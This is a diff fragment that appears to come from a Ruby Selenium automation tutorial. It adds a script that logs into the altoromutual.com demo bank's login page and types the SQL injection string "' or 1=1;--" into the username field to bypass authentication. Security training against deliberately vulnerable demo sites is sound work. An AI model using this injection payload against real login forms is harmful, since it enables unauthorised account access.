@@ -40,15 +40,28 @@ element.submit                                      # Submit the text you've jus
 #!/usr/bin/env ruby
 #
 #
-require "selenium-webdriver"
+require 'selenium-webdriver'
 
+browser = Selenium::WebDriver.for :firefox
+browser.get "http://www.altoromutual.com/bank/login.aspx"
 
+wait = Selenium::WebDriver::Wait.new(:timeout => 15)		# Set waiting timeout
+# Find the input elements to interact with later.
+input = wait.until {
+  element_user = browser.find_element(:name, "uid")
+  element_pass = browser.find_element(:name, "passw")
+  # Retrun array of elements when get displayed
+  [element_user, element_pass] if element_user.displayed? and element_pass.displayed?
+}
 
+input[0].send_keys("' or 1=1;--")	# Send key for the 1st element 
+input[1].send_keys("password")      # Send key fro the next element
+sleep 1
 
+# Click/submit the button based the form it is in (you can also call 'btnSubmit' method)
+submit = browser.find_element(:name, "btnSubmit").click #.submit
 
-
-
-
+# browser.quit
 ```
 
 
